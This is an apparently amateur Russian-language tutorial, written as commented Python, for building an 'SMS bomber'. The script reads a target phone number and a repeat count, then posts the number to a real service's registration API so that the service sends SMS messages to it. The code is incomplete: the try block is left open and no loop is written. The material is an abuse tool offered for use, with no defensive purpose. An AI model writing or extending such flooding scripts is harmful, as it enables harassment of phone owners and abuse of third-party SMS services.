#Что на понадобиться? Библиотека requests. Зачем она нужна?
#Это самая важная библиотека в бомбере. Если говорить просто, он и даёт нам посылать запрос на сайт.

#Делаем кнопку куда вводить наш номер. Это можно сделать, так:

#num = input('Номер (79670000000): ')
#num - это переменная которая вызывается сайтом. Этот то номер, который вы ввели.
#С помощью input мы делаем, как-бы "кнопку" куда мы будем вводить.

#У нас уже получилось :

import requests

num = input('Номер (79670000000): ')

#Можно сделать количество повторов.. Делается это так:

lim = int(input('Количество повторов (рекомендуем значение меньше 4.): '))

#Тут можно поставить сколько раз будет идти цикл в ленте сервисов.

#Дальше мы ставим:

numplus = '+' + num
def spam():
    try:

#Тут понятно даже тому, кто и не знает python.
#Дальше добавляем уже сами сервисы:

#try:
        print(requests.post("http://mobile-api.metropolis.moscow/v1/register",data = {'phone': num}))

#print - показывает что будет с запросом(после того как система пошлёт запрос, мы увидим, всё хорошо или произошла ошибка.)
#requests.post - это и есть сам requests, с помощью requests-библиотеки посылается любой http/https запрос.

#Разбираем сам запрос к сайту!

#data = {'phone': num}))

#data - это то, с помощью чего мы шлем запрос. Я буду говорит очень поверхностно, потому что многие и не поймут начала.
#Переменная 'phone' это то что просит сайт, телефон!

#Про num мы говорили с начале!
#num = input('Номер (79670000000): ')
#Когда мы вставляем номер, с переменной num - автоматически вставляется в запрос под видом номера телефона. Ну и на этот номер телефона идёт SMS-оповещение.